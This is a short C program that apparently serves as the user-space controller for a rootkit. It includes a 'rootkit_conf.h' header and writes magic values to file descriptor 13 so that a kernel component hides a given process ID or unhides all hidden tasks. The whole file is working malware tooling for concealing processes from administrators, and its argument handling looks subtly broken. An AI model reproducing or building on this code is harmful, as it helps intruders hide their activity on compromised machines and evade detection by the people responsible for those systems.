#include <stdio.h>
#include <unistd.h>

#include "rootkit_conf.h"

int main(int argc,char *argv[]){
int pid;

if (argc < 2){
  printf(" usage: %s <mode> [<pid>]\n  modes:\n\tshowall\t\t - unhides all\n\
  \thidepid\t\t - hides task with this pid\n",argv[0]);
  exit(1);
}

if (strcmp(argv[1],"showall")==0) write(13,SHOWALL,13);
if (strcmp(argv[1],"hidepid")==0){
    pid = atoi(argv[2]);
    write(13,HIDETSK,pid);
}

exit(1);
}
